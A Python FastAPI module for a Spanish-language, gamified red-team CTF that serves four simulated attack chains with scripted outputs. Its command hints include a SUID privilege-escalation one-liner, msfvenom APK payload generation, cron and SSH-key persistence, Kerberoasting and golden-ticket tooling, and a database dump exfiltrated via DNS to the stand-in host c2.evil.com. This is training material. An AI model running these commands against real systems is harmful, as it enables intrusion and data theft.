# ============================================================================
# RED TEAM CTF EXERCISES - X=pi by Carbi
# Guided attack chain scenarios (educational/gamified)
# Initial Access -> Persistence -> Lateral Movement -> Exfiltration
# ============================================================================

from fastapi import APIRouter, HTTPException
from pydantic import BaseModel
from typing import Optional, List, Dict
from datetime import datetime
import uuid
import random

ctf_router = APIRouter(prefix="/api/ctf", tags=["Red Team CTF"])

# ============================================================================
# MODELS
# ============================================================================

class StepAction(BaseModel):
    exercise_id: str
    step_index: int
    user_input: Optional[str] = ""

class StartExercise(BaseModel):
    exercise_id: str
    operator_name: Optional[str] = "Ghost"

# ============================================================================
# EXERCISE DATABASE
# ============================================================================

EXERCISES = [
    {
        "id": "EX-001",
        "name": "Operation Shadow Entry",
        "description": "Compromete un servidor web Linux, establece persistencia y exfiltra datos sensibles del servidor de base de datos interno.",
        "difficulty": "BEGINNER",
        "category": "Full Kill Chain",
        "estimated_time": "15 min",
        "target_network": "10.0.1.0/24",
        "objectives": ["Acceso inicial via web exploit", "Escalacion de privilegios", "Persistencia", "Exfiltracion de datos"],
        "reward_points": 100,
        "steps": [
            {
                "phase": "RECONNAISSANCE",
                "title": "Escaneo de Red",
                "description": "Ejecuta un escaneo de puertos en el servidor objetivo 10.0.1.10 para identificar servicios expuestos.",
                "command_hint": "nmap -sV 10.0.1.10",
                "expected_action": "port_scan",
                "success_output": "PORT     STATE  SERVICE    VERSION\n22/tcp   open   ssh        OpenSSH 8.9\n80/tcp   open   http       Apache 2.4.52\n3306/tcp open   mysql      MySQL 8.0.32\n8080/tcp open   http-proxy Tomcat 9.0",
                "intel_gained": "Servicios: SSH, Apache, MySQL, Tomcat. Apache tiene version vulnerable.",
                "points": 10
            },
            {
                "phase": "INITIAL ACCESS",
                "title": "Exploit Web - CVE-2024-XXXX",
                "description": "Apache 2.4.52 tiene una vulnerabilidad de path traversal. Usa el exploit para obtener una shell reversa.",
                "command_hint": "exploit apache_path_traversal -t 10.0.1.10 -p 80",
                "expected_action": "exploit",
                "success_output": "[*] Sending payload to 10.0.1.10:80...\n[*] Exploiting CVE-2024-XXXX path traversal...\n[+] Shell obtained!\n[+] Connected as: www-data@web-server-01\n$ whoami\nwww-data",
                "intel_gained": "Shell como www-data en web-server-01. Privilegios limitados.",
                "points": 20
            },
            {
                "phase": "PRIVILEGE ESCALATION",
                "title": "Escalacion a Root",
                "description": "Enumera el sistema para encontrar vectores de escalacion. Busca binarios SUID o credenciales expuestas.",
                "command_hint": "find / -perm -4000 2>/dev/null",
                "expected_action": "privesc",
                "success_output": "[*] Enumerating SUID binaries...\n/usr/bin/python3.10 (SUID bit set!)\n[*] Exploiting python3 SUID...\n$ python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\n[+] Privilege escalated!\nroot@web-server-01:~# whoami\nroot",
                "intel_gained": "Acceso root completo. Python3 tenia SUID configurado incorrectamente.",
                "points": 25
            },
            {
                "phase": "PERSISTENCE",
                "title": "Instalar Backdoor",
                "description": "Establece persistencia creando un servicio systemd y una tarea cron para mantener acceso.",
                "command_hint": "install_persistence --method all",
                "expected_action": "persistence",
                "success_output": "[+] Persistence methods installed:\n  1. Crontab: */5 * * * * /tmp/.sys_update >/dev/null 2>&1\n  2. Systemd: /etc/systemd/system/sys-monitor.service (enabled)\n  3. SSH key: Added to /root/.ssh/authorized_keys\n  4. Bashrc: Backdoor in /root/.bashrc\n[+] 4/4 persistence methods active",
                "intel_gained": "4 metodos de persistencia instalados. Acceso garantizado post-reboot.",
                "points": 15
            },
            {
                "phase": "LATERAL MOVEMENT",
                "title": "Movimiento al Servidor de BD",
                "description": "Usa las credenciales encontradas en config.php para acceder al servidor MySQL interno.",
                "command_hint": "cat /var/www/html/config.php && mysql -h 10.0.1.20 -u admin -p",
                "expected_action": "lateral",
                "success_output": "[*] Reading /var/www/html/config.php...\n  DB_HOST=10.0.1.20\n  DB_USER=admin\n  DB_PASS=Str0ngP@ss2024!\n[*] Connecting to MySQL 10.0.1.20...\n[+] Connected to db-server-01!\nMySQL [(admin)]> SHOW DATABASES;\n+--------------------+\n| users_db           |\n| financial_data     |\n| backup_2024        |\n+--------------------+",
                "intel_gained": "Acceso al servidor de BD con 3 bases de datos sensibles.",
                "points": 20
            },
            {
                "phase": "EXFILTRATION",
                "title": "Exfiltrar Datos Sensibles",
                "description": "Extrae los datos de la tabla de usuarios y envialos al servidor C2 via DNS tunneling.",
                "command_hint": "mysqldump users_db | dns_exfil -d c2.evil.com",
                "expected_action": "exfiltrate",
                "success_output": "[*] Dumping users_db.credentials...\n  Records: 15,847 users\n  Size: 2.3MB\n[*] Encoding data for DNS exfiltration...\n[*] Sending via DNS queries to c2.evil.com...\n  Sent: 2.3MB in 847 DNS queries\n[+] Exfiltration complete!\n[+] Data received at C2 server\n\n=== MISSION COMPLETE ===\nTotal time: 12m 34s",
                "intel_gained": "15,847 registros de usuarios exfiltrados exitosamente.",
                "points": 10
            }
        ]
    },
    {
        "id": "EX-002",
        "name": "Operation Mobile Ghost",
        "description": "Compromete un dispositivo Android en la red corporativa, roba credenciales y accede al servidor interno.",
        "difficulty": "INTERMEDIATE",
        "category": "Mobile + Network",
        "estimated_time": "20 min",
        "target_network": "10.0.3.0/24",
        "objectives": ["Instalar RAT en Android", "Capturar credenciales", "Pivot a red interna", "Acceder a servidor corporativo"],
        "reward_points": 200,
        "steps": [
            {
                "phase": "RECONNAISSANCE",
                "title": "Identificar Objetivo Movil",
                "description": "Escanea la red WiFi corporativa para identificar dispositivos moviles conectados.",
                "command_hint": "arp-scan 10.0.3.0/24 --os-detect",
                "expected_action": "scan",
                "success_output": "10.0.3.50  Google Pixel 8 (Android 14)    ACTIVE\n10.0.3.51  Samsung S23 (Android 13)       ACTIVE\n10.0.3.60  iPhone 15 Pro (iOS 17.2)       ACTIVE\n[*] Target selected: 10.0.3.50 (Pixel 8)",
                "intel_gained": "3 dispositivos moviles detectados. Pixel 8 seleccionado como objetivo.",
                "points": 15
            },
            {
                "phase": "WEAPONIZE",
                "title": "Crear APK Malicioso",
                "description": "Genera un APK troyanizado que se disfrace como una actualizacion de seguridad.",
                "command_hint": "msfvenom -p android/meterpreter/reverse_https LHOST=10.0.0.1 -o SecurityUpdate.apk",
                "expected_action": "build",
                "success_output": "[*] Generating payload: android/meterpreter/reverse_https\n[*] Injecting into legitimate APK template...\n[*] Applying ProGuard obfuscation...\n[*] Adding anti-emulator checks...\n[+] Payload generated: SecurityUpdate.apk (2.4MB)\n[+] Detection rate: 3/65 engines",
                "intel_gained": "APK generado con baja deteccion. Listo para delivery.",
                "points": 20
            },
            {
                "phase": "DELIVERY",
                "title": "Entregar Payload via Phishing",
                "description": "Envia un SMS phishing al objetivo con link de descarga del APK.",
                "command_hint": "send_sms -t +521234567890 -m 'Actualizacion de seguridad critica' -link https://update.corp.mx/security.apk",
                "expected_action": "deliver",
                "success_output": "[*] SMS sent to +521234567890\n[*] Waiting for target to install...\n[+] APK downloaded by target!\n[+] APK installed - permissions granted!\n[+] Meterpreter session 1 opened (10.0.0.1:443 -> 10.0.3.50:48291)",
                "intel_gained": "RAT instalado exitosamente. Sesion meterpreter activa.",
                "points": 20
            },
            {
                "phase": "CREDENTIAL HARVEST",
                "title": "Capturar Credenciales",
                "description": "Activa el keylogger y captura credenciales cuando el usuario acceda a apps corporativas.",
                "command_hint": "keylog_start && wait_credentials",
                "expected_action": "harvest",
                "success_output": "[*] Keylogger activated on Pixel 8...\n[*] Monitoring app: corp-vpn.apk\n[+] Credentials captured!\n  App: Corporate VPN\n  User: carlos.mendez@corp.mx\n  Pass: C0rp2024!Secure\n  VPN Server: vpn.corp.mx:1194\n[+] Corporate VPN credentials obtained!",
                "intel_gained": "Credenciales VPN corporativas capturadas.",
                "points": 25
            },
            {
                "phase": "PIVOT",
                "title": "Conectar a Red Corporativa",
                "description": "Usa las credenciales VPN para acceder a la red corporativa interna.",
                "command_hint": "openvpn --config corp.ovpn --auth-user-pass creds.txt",
                "expected_action": "pivot",
                "success_output": "[*] Connecting to vpn.corp.mx:1194...\n[+] VPN connected! Internal IP: 172.16.0.105\n[*] Scanning internal network 172.16.0.0/24...\n  172.16.0.1  - Gateway\n  172.16.0.10 - DC01 (Windows Server)\n  172.16.0.20 - FileServer01\n  172.16.0.30 - Exchange Server\n[+] Corporate network mapped!",
                "intel_gained": "Acceso a red interna. Servidores criticos identificados.",
                "points": 30
            },
            {
                "phase": "OBJECTIVE",
                "title": "Acceder a Servidor de Archivos",
                "description": "Accede al servidor de archivos y descarga documentos confidenciales.",
                "command_hint": "smbclient //172.16.0.20/confidencial -U carlos.mendez",
                "expected_action": "objective",
                "success_output": "[*] Connecting to FileServer01...\n[+] Authenticated as carlos.mendez\n[*] Browsing \\\\confidencial\\\\\n  /financials/       - Q4_2024_report.xlsx (2.1MB)\n  /hr/               - salarios_2024.pdf (890KB)\n  /legal/            - contratos_clientes.docx (1.5MB)\n[+] Files downloaded: 3 documents (4.5MB)\n\n=== MISSION COMPLETE ===\nTotal time: 18m 22s",
                "intel_gained": "Documentos confidenciales obtenidos via movimiento lateral desde dispositivo movil.",
                "points": 40
            }
        ]
    },
    {
        "id": "EX-003",
        "name": "Operation Domain Domination",
        "description": "Compromete un Active Directory completo: desde un phishing hasta el control total del dominio.",
        "difficulty": "ADVANCED",
        "category": "Active Directory",
        "estimated_time": "30 min",
        "target_network": "10.0.1.0/24 (LAB.LOCAL)",
        "objectives": ["Phishing inicial", "Kerberoasting", "Pass-the-Hash", "Domain Admin", "Golden Ticket"],
        "reward_points": 500,
        "steps": [
            {
                "phase": "INITIAL ACCESS",
                "title": "Phishing - Macro Maliciosa",
                "description": "Envia un documento Word con macro VBA a un empleado para obtener acceso inicial.",
                "command_hint": "send_phish -t user@lab.local -doc invoice.docm",
                "expected_action": "phish",
                "success_output": "[*] Sending phishing email with invoice.docm...\n[+] Email delivered to user@lab.local\n[+] Document opened! Macro executed!\n[+] Reverse shell received from DESKTOP-LAB01 (10.0.1.40)\n  User: LAB\\jsmith\n  Privileges: Standard User",
                "intel_gained": "Acceso como usuario estandar en estacion de trabajo del dominio.",
                "points": 20
            },
            {
                "phase": "ENUMERATION",
                "title": "Enumeracion de Active Directory",
                "description": "Enumera usuarios, grupos y servicios del dominio para planificar la escalacion.",
                "command_hint": "bloodhound-collect && enum_spns",
                "expected_action": "enumerate",
                "success_output": "[*] Running BloodHound collector...\n  Users: 245\n  Groups: 38\n  Computers: 12\n  GPOs: 15\n[*] Enumerating SPNs...\n  MSSQLSvc/SQL01.lab.local:1433 - svc_sql\n  HTTP/WEB01.lab.local - svc_web\n  CIFS/FS01.lab.local - svc_backup\n[+] 3 Kerberoastable accounts found!",
                "intel_gained": "245 usuarios, 3 cuentas de servicio vulnerables a Kerberoasting.",
                "points": 25
            },
            {
                "phase": "CREDENTIAL ACCESS",
                "title": "Kerberoasting",
                "description": "Solicita tickets TGS para las cuentas de servicio y crackea sus passwords offline.",
                "command_hint": "GetUserSPNs.py lab.local/jsmith -request && hashcat -m 13100",
                "expected_action": "kerberoast",
                "success_output": "[*] Requesting TGS tickets...\n  svc_sql: $krb5tgs$23$*svc_sql$LAB.LOCAL$...\n  svc_web: $krb5tgs$23$*svc_web$LAB.LOCAL$...\n  svc_backup: $krb5tgs$23$*svc_backup$LAB.LOCAL$...\n[*] Cracking with hashcat...\n  svc_sql: Sql@dmin2024!\n  svc_backup: B@ckup_Pass1\n[+] 2/3 passwords cracked!",
                "intel_gained": "Credenciales de svc_sql y svc_backup obtenidas.",
                "points": 30
            },
            {
                "phase": "LATERAL MOVEMENT",
                "title": "Pass-the-Hash al DC",
                "description": "Usa la cuenta svc_backup para acceder al Domain Controller y extraer hashes NTLM.",
                "command_hint": "psexec.py svc_backup@10.0.1.41 && secretsdump.py",
                "expected_action": "pass_hash",
                "success_output": "[*] Connecting to SRV-DC01 (10.0.1.41) as svc_backup...\n[+] Access granted! svc_backup has backup operator privileges!\n[*] Running secretsdump.py...\n  Administrator:500:aad3b435:8846f7eaee8fb117ad06...\n  krbtgt:502:aad3b435:4a8a9c5f5c2e6b91...\n  svc_sql:1103:aad3b435:2b576acbe6b...\n[+] Domain hashes extracted! Including krbtgt!",
                "intel_gained": "Hash de Administrator y krbtgt obtenidos del DC.",
                "points": 40
            },
            {
                "phase": "DOMAIN ADMIN",
                "title": "Golden Ticket Attack",
                "description": "Crea un Golden Ticket con el hash krbtgt para obtener acceso permanente como Domain Admin.",
                "command_hint": "ticketer.py -nthash 4a8a9c5f -domain-sid S-1-5-21-... -domain lab.local Administrator",
                "expected_action": "golden_ticket",
                "success_output": "[*] Forging Golden Ticket...\n  Domain: LAB.LOCAL\n  SID: S-1-5-21-3456789012-1234567890-9876543210\n  User: Administrator\n  krbtgt hash: 4a8a9c5f5c2e6b91...\n[+] Golden Ticket created: ticket.kirbi\n[+] Ticket injected into current session!\n[*] Testing access...\n  dir \\\\SRV-DC01\\c$\n[+] DOMAIN ADMIN ACCESS CONFIRMED!\n\n=== MISSION COMPLETE ===\nDomain LAB.LOCAL fully compromised!",
                "intel_gained": "Control total del dominio. Golden Ticket permite acceso persistente indefinido.",
                "points": 50
            }
        ]
    },
    {
        "id": "EX-004",
        "name": "Operation iOS Zero-Day",
        "description": "Simula un ataque avanzado a un dispositivo iOS usando una cadena de exploits zero-click.",
        "difficulty": "EXPERT",
        "category": "Mobile APT",
        "estimated_time": "25 min",
        "target_network": "10.0.3.0/24",
        "objectives": ["Craft zero-click exploit", "Bypass iOS security", "Extract keychain", "Persistent implant"],
        "reward_points": 750,
        "steps": [
            {
                "phase": "TARGET ANALYSIS",
                "title": "Fingerprint del Dispositivo",
                "description": "Identifica la version exacta de iOS y las apps instaladas en el iPhone objetivo.",
                "command_hint": "device_fingerprint -t 10.0.3.60",
                "expected_action": "fingerprint",
                "success_output": "[*] Fingerprinting device 10.0.3.60...\n  Model: iPhone 15 Pro (A17 Pro)\n  iOS: 17.2 (21C62)\n  Jailbreak: No\n  iMessage: Active\n  FaceTime: Active\n  Safari: 17.2\n[*] Known vulns for iOS 17.2: CVE-2024-XXXXX (iMessage)\n[+] Zero-click vector identified: iMessage processing bug",
                "intel_gained": "iPhone 15 Pro con iOS 17.2. Vulnerable a exploit iMessage.",
                "points": 25
            },
            {
                "phase": "EXPLOIT DEVELOPMENT",
                "title": "Craft Zero-Click Exploit",
                "description": "Prepara el exploit zero-click que se activa al recibir un mensaje iMessage especialmente crafteado.",
                "command_hint": "build_exploit --type imessage_zeroclick --target ios17.2",
                "expected_action": "craft_exploit",
                "success_output": "[*] Building iMessage zero-click exploit chain...\n  Stage 1: NSKeyedUnarchiver type confusion\n  Stage 2: PAC bypass via PACDA gadget\n  Stage 3: Kernel r/w primitive\n  Stage 4: Implant injection\n[*] Compiling exploit payload (arm64e)...\n[+] Exploit ready: imsg_exploit.bin (48KB)\n[+] Trigger: Invisible iMessage attachment",
                "intel_gained": "Exploit chain de 4 etapas preparado. Invisible para el usuario.",
                "points": 40
            },
            {
                "phase": "EXPLOITATION",
                "title": "Enviar Exploit Zero-Click",
                "description": "Envia el exploit via iMessage. El objetivo no necesita interactuar - se ejecuta automaticamente.",
                "command_hint": "send_imessage -t target@icloud.com -payload imsg_exploit.bin",
                "expected_action": "zero_click",
                "success_output": "[*] Sending iMessage to target@icloud.com...\n[*] Message delivered (invisible attachment)\n[*] Waiting for exploit execution...\n[+] Stage 1: Type confusion triggered!\n[+] Stage 2: PAC bypass successful!\n[+] Stage 3: Kernel r/w obtained!\n[+] Stage 4: Implant installed!\n[+] Zero-click exploit successful!\n[+] Root access on iPhone 15 Pro",
                "intel_gained": "Acceso root al iPhone. Sin interaccion del usuario requerida.",
                "points": 50
            },
            {
                "phase": "DATA EXTRACTION",
                "title": "Extraer Keychain y Datos",
                "description": "Extrae el keychain de iOS con todas las credenciales almacenadas, fotos y mensajes.",
                "command_hint": "extract_keychain && dump_photos && dump_messages",
                "expected_action": "extract",
                "success_output": "[*] Extracting iOS Keychain...\n  WiFi passwords: 15\n  App passwords: 23\n  Credit cards: 3 (tokenized)\n  Certificates: 5\n[*] Extracting iMessage history...\n  Messages: 4,521\n  Attachments: 892\n[*] Extracting Photos...\n  Photos: 12,340\n  Location data: enabled\n[+] Total extracted: 1.8GB of sensitive data",
                "intel_gained": "Keychain, mensajes y fotos extraidos. 1.8GB de datos sensibles.",
                "points": 35
            },
            {
                "phase": "PERSISTENCE",
                "title": "Implante Persistente",
                "description": "Instala un implante que sobrevive reinicios modificando el trust cache del kernel.",
                "command_hint": "install_implant --persist kernel_trustcache",
                "expected_action": "implant",
                "success_output": "[*] Installing persistent implant...\n  Method: Kernel trust cache modification\n  Binary: /usr/libexec/.sysdiagd (disguised)\n  Trigger: Boot-time via XPC service\n[*] Testing persistence...\n  Simulated reboot...\n  [+] Implant survived reboot!\n[+] Persistent access established!\n\n=== MISSION COMPLETE ===\niPhone 15 Pro fully compromised with persistent access",
                "intel_gained": "Implante persistente instalado. Sobrevive reinicios.",
                "points": 50
            }
        ]
    }
]

# In-memory progress tracking
PROGRESS: Dict[str, Dict] = {}

# ============================================================================
# ENDPOINTS
# ============================================================================

@ctf_router.get("/exercises")
async def list_exercises():
    """List all available Red Team exercises"""
    exercises = []
    for ex in EXERCISES:
        exercises.append({
            "id": ex["id"],
            "name": ex["name"],
            "description": ex["description"],
            "difficulty": ex["difficulty"],
            "category": ex["category"],
            "estimated_time": ex["estimated_time"],
            "total_steps": len(ex["steps"]),
            "reward_points": ex["reward_points"],
            "objectives": ex["objectives"],
        })
    return {
        "exercises": exercises,
        "total": len(exercises),
        "difficulties": {"BEGINNER": 1, "INTERMEDIATE": 1, "ADVANCED": 1, "EXPERT": 1},
        "total_points_available": sum(e["reward_points"] for e in EXERCISES),
        "disclaimer": "Todos los ejercicios son SIMULADOS. No se ejecutan ataques reales.",
        "timestamp": datetime.utcnow().isoformat()
    }


@ctf_router.post("/start")
async def start_exercise(req: StartExercise):
    """Start a Red Team exercise"""
    exercise = next((e for e in EXERCISES if e["id"] == req.exercise_id), None)
    if not exercise:
        raise HTTPException(status_code=404, detail=f"Exercise {req.exercise_id} not found")

    session_id = str(uuid.uuid4())[:8]
    PROGRESS[session_id] = {
        "session_id": session_id,
        "exercise_id": exercise["id"],
        "exercise_name": exercise["name"],
        "operator": req.operator_name,
        "current_step": 0,
        "total_steps": len(exercise["steps"]),
        "score": 0,
        "max_score": sum(s["points"] for s in exercise["steps"]),
        "completed_steps": [],
        "status": "in_progress",
        "started_at": datetime.utcnow().isoformat(),
    }

    first_step = exercise["steps"][0]
    return {
        "session_id": session_id,
        "exercise": exercise["name"],
        "difficulty": exercise["difficulty"],
        "operator": req.operator_name,
        "target_network": exercise["target_network"],
        "objectives": exercise["objectives"],
        "total_steps": len(exercise["steps"]),
        "current_step": {
            "index": 0,
            "phase": first_step["phase"],
            "title": first_step["title"],
            "description": first_step["description"],
            "command_hint": first_step["command_hint"],
        },
        "status": "in_progress",
        "timestamp": datetime.utcnow().isoformat()
    }


@ctf_router.post("/execute")
async def execute_step(req: StepAction):
    """Execute current step in the exercise"""
    exercise = next((e for e in EXERCISES if e["id"] == req.exercise_id), None)
    if not exercise:
        raise HTTPException(status_code=404, detail="Exercise not found")

    if req.step_index < 0 or req.step_index >= len(exercise["steps"]):
        raise HTTPException(status_code=400, detail="Invalid step index")

    step = exercise["steps"][req.step_index]
    is_last = req.step_index == len(exercise["steps"]) - 1

    result = {
        "exercise_id": req.exercise_id,
        "step_index": req.step_index,
        "phase": step["phase"],
        "title": step["title"],
        "output": step["success_output"],
        "intel_gained": step["intel_gained"],
        "points_earned": step["points"],
        "status": "success",
        "is_last_step": is_last,
    }

    if not is_last:
        next_step = exercise["steps"][req.step_index + 1]
        result["next_step"] = {
            "index": req.step_index + 1,
            "phase": next_step["phase"],
            "title": next_step["title"],
            "description": next_step["description"],
            "command_hint": next_step["command_hint"],
        }
    else:
        total_points = sum(s["points"] for s in exercise["steps"])
        result["mission_complete"] = True
        result["final_score"] = total_points
        result["max_score"] = total_points
        result["grade"] = "S+" if total_points >= exercise["reward_points"] else "A"
        result["completion_message"] = f"MISION COMPLETA: {exercise['name']}. Puntuacion: {total_points}/{total_points}"

    result["timestamp"] = datetime.utcnow().isoformat()
    return result


@ctf_router.get("/exercise/{exercise_id}")
async def get_exercise_detail(exercise_id: str):
    """Get full exercise details with all steps"""
    exercise = next((e for e in EXERCISES if e["id"] == exercise_id), None)
    if not exercise:
        raise HTTPException(status_code=404, detail="Exercise not found")

    steps_summary = []
    for i, step in enumerate(exercise["steps"]):
        steps_summary.append({
            "index": i,
            "phase": step["phase"],
            "title": step["title"],
            "description": step["description"],
            "command_hint": step["command_hint"],
            "points": step["points"],
        })

    return {
        "exercise": exercise,
        "steps": steps_summary,
        "total_points": sum(s["points"] for s in exercise["steps"]),
        "timestamp": datetime.utcnow().isoformat()
    }


@ctf_router.get("/leaderboard")
async def get_leaderboard():
    """Get simulated leaderboard"""
    return {
        "leaderboard": [
            {"rank": 1, "operator": "Gh0st_Admin", "score": 1550, "exercises_completed": 4, "fastest_time": "8m 12s"},
            {"rank": 2, "operator": "DarkCyber", "score": 1200, "exercises_completed": 3, "fastest_time": "10m 45s"},
            {"rank": 3, "operator": "NullByte", "score": 950, "exercises_completed": 3, "fastest_time": "12m 30s"},
            {"rank": 4, "operator": "ShadowHex", "score": 700, "exercises_completed": 2, "fastest_time": "15m 22s"},
            {"rank": 5, "operator": "CryptoPhantom", "score": 500, "exercises_completed": 2, "fastest_time": "18m 10s"},
            {"rank": 6, "operator": "ZeroDay_MX", "score": 300, "exercises_completed": 1, "fastest_time": "14m 55s"},
            {"rank": 7, "operator": "H4ck3r_Carbi", "score": 100, "exercises_completed": 1, "fastest_time": "20m 00s"},
        ],
        "total_operators": 7,
        "total_points_available": sum(e["reward_points"] for e in EXERCISES),
        "timestamp": datetime.utcnow().isoformat()
    }
